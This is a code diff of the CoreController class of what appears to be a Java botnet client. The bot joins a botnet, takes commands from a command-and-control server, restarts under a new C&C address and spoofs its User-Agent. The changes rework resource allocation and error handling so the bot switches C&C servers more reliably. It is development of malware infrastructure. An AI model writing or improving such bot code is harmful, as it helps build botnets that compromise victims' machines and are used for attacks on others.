@@ -298,7 +298,6 @@ public class CoreController {
     }
 
     CONTROLLER = controller;
-    allocateResources();
   }
 
   /**
@@ -313,7 +312,7 @@ public class CoreController {
     LOGGER.info("Joining botnet...");
     boolean success = false;
     int controllerId = 0;
-    Controller controller = null;
+    Controller controller;
     while (!success) {
       controller = AppConfigurationService.getConfigurations().getControllers().get(controllerId);
       try {
@@ -329,6 +328,7 @@ public class CoreController {
       }
     }
     LOGGER.trace("Botnet joined");
+    allocateResources();
     changeState(BotState.EXECUTION);
     LOGGER.info("Bot is up and running");
   }
@@ -338,9 +338,10 @@ public class CoreController {
    * @param cmd the command to execute.
    * @throws BotMalformedCommandException when command parameters are malformed.
    * @throws BotExecutionException when command cannot be correctly executed.
+   * @throws BotFatalException when command causes fatal errors.
    */
   private static void executeCommand(final BotCommand cmd)
-      throws BotMalformedCommandException, BotExecutionException {
+      throws BotMalformedCommandException, BotExecutionException, BotFatalException {
     LOGGER.traceEntry("cmd={}", cmd);
     LOGGER.info("Executing command {} with params {}", cmd.getScope(), cmd.getParams());
 
@@ -417,7 +418,11 @@ public class CoreController {
           delayCommand(restartDelay.getRandomDuration(), CommandScope.RESTART);
         }
 
-        restartBot(controller, restartWait);
+        try {
+          restartBot(controller, restartWait);
+        } catch (BotInitializationException exc) {
+          throw new BotFatalException(exc.getMessage());
+        }
 
         break;
 
@@ -561,11 +566,14 @@ public class CoreController {
    * @param controller the new controller.
    * @param wait if true, waits for jobs to complete; if false, kills immediately
    * @throws BotExecutionException when command `RESTART` cannot be correctly executed.
+   * @throws BotInitializationException
    */
-  private static void restartBot(Controller controller, boolean wait) throws BotExecutionException {
+  private static void restartBot(Controller controller, boolean wait) throws BotExecutionException, BotInitializationException {
     LOGGER.info("Restarting bot configuration with C&C at {}...", controller.getInitResource());
 
     changeState(BotState.JOIN);
+
+    freeResources(wait);
 
     Controller oldController = CONTROLLER;
 
@@ -574,9 +582,8 @@ public class CoreController {
     } catch (ControllerConnectionException exc) {
       LOGGER.warn("Cannot restart bot with C&C at {}, reloading previous C&C...", controller.getInitResource());
       CONTROLLER = oldController;
-    } catch (BotInitializationException exc) {
-      exc.printStackTrace();
     }
+    allocateResources();
     changeState(BotState.EXECUTION);
     LOGGER.info("Bot restarted with C&C at {}", CONTROLLER.getInitResource());
   }
@@ -632,7 +639,7 @@ public class CoreController {
         }
         AppConfigurationService.getConfigurations().setSleep(sleep);
       } else if (settings.equals(ControllerProperties.USER_AGENT)){
-        CONTROLLER.getAuthentication().put(ControllerProperties.USER_AGENT, settings.get(property));
+        CONTROLLER.getAuthentication().put("User-Agent", settings.get(property));
       } else {
         LOGGER.warn("Cannot update [{}], skipping. This version does not provide the update procedure.", property);
       }
